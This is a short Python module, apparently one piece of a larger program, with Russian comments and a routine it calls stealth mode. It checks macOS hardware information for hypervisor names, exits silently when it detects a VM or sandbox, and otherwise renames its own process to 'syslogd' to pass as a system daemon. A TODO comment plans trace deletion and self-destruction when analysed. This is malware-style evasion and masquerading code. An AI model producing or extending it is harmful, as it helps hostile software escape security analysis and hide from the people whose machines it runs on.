import os
import sys
import platform
import subprocess

def is_vm():
    # Простейший детект VM по признакам
    vm_indicators = [
        'VBOX', 'VMWARE', 'VIRTUAL', 'QEMU', 'KVM', 'PARALLELS', 'XEN', 'HYPER-V'
    ]
    try:
        output = subprocess.check_output(['system_profiler', 'SPHardwareDataType'], stderr=subprocess.DEVNULL).decode().upper()
        if any(ind in output for ind in vm_indicators):
            return True
    except Exception:
        pass
    return False

def hide_process():
    # Маскировка имени процесса (Linux/macOS)
    try:
        import setproctitle
        setproctitle.setproctitle('syslogd')
    except Exception:
        pass

def enable_stealth():
    print("[STEALTH] Stealth mode enabled.")
    if is_vm():
        print("[STEALTH] VM/Sandbox detected! Exiting...")
        sys.exit(0)
    hide_process()
    # TODO: добавить уход в бэкграунд, удаление следов, самоуничтожение при анализе
